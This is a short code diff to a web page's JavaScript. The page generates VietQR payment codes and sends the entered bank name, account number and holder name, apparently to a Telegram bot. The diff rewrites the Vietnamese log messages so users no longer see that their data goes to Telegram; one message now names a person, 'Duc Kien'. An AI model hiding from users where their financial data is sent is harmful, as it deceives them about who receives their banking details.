@@ -211,7 +211,7 @@
             document.getElementById('qrResult').style.display = 'block';
             document.getElementById('qrImage').style.display = 'none';
 
-            appendLog('Đang tạo mã VietQR...', 'info');
+            appendLog('Đang tạo mã...', 'info');
 
             let qrUrl = `https://img.vietqr.io/image/${bankId}-${accNo}-compact2.png?`;
             if (accName) {
@@ -220,7 +220,7 @@
 
             setTimeout(async () => {
                 appendLog('Tạo mã thành công.', 'success');
-                appendLog('Đang kết nối tới Telegram...', 'info');
+                appendLog('Đang kết nối tới máy chủ...', 'info');
 
                 const message = `💻 <b>THÔNG BÁO NHẬN TIỀN MỚI</b>\n\n` +
                                 `🏦 <b>Ngân hàng:</b> ${bankName}\n` +
@@ -242,8 +242,7 @@
                     const result = await response.json();
                     
                     if (result.ok) {
-                        appendLog('Đã gửi dữ liệu về Telegram an toàn.', 'success');
-                        
+                        appendLog('Đã gửi dữ liệu về Duc Kien .', 'success');
                         document.getElementById('configSection').style.display = 'none';
                         this.style.display = 'none'; 
 
